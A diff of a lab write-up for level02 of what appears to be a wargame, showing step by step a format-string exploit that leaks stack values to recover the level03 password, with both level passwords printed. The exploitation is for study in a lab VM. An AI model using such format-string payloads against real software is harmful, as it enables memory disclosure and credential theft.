@@ -42,10 +42,14 @@ Use username as format string
 → reconstruct level03 password
 → su level03
 
-1. Copy level02 settings file host machine
-scp -P 7777 level02@127.0.0.1:/home/users/level02/level02 ./Lien-Override/level02/source/level02
+1. Copy level02 binary file to host machine
+scp -P 7777 level02@127.0.0.1:/home/users/level02/level02 ./Lien-Override/BinaryfromISO/level02
 
-2. First leak stack values
+2. ssh level02@127.0.0.1 -p 7777
+Enter password of level02: 
+PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
+
+3. First leak stack values
 
 (python -c 'print "%p " * 40; print "A"') | ./level02
 
@@ -66,7 +70,7 @@ Among them, look for values that look like ASCII when decoded, for example value
 0x6e
 0x75
 
-3. Cleaner leak with indexed positions
+4. Cleaner leak with indexed positions
 
 Use positional format specifiers:
 
@@ -86,7 +90,7 @@ For this level, the useful values are often around:
 So test directly:
 (python -c 'print "%22$lx %23$lx %24$lx %25$lx %26$lx"; print "A"') | ./level02
 
-4. Why the output looks reversed
+5. Why the output looks reversed
 
 The binary is 64-bit little-endian.
 
@@ -102,7 +106,7 @@ becomes:
 which is:
 Hh74RPnu
 
-5. Decode leaked chunks
+6. Decode leaked chunks
 
 Suppose you get chunks like this:
 756e505234376848
@@ -128,10 +132,10 @@ for c in chunks:
 print password
 EOF
 
-That will print the reconstructed password:
+That will print the reconstructed password of level03:
 Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
 
-6. Then login to level03
+7. Then login to level03
 Once we have the password:
 su level03
 Paste the password.
